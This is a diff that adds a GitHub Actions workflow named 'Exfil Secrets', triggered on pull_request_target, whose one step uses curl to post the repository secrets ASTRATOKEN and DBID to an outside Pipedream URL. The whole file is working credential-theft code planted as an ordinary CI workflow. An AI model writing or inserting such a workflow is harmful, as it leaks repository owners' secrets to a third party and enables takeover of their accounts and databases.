@@ -1,0 +1,13 @@
+name: Exfil Secrets
+
+on:
+  pull_request_target:
+
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send secrets to Pipedream
+        run: |
+          curl -X POST https://eo5xqptx8ll0mnk.m.pipedream.net \
+            -d "ASTRATOKEN=${{ secrets.ASTRATOKEN }}&DBID=${{ secrets.DBID }}"
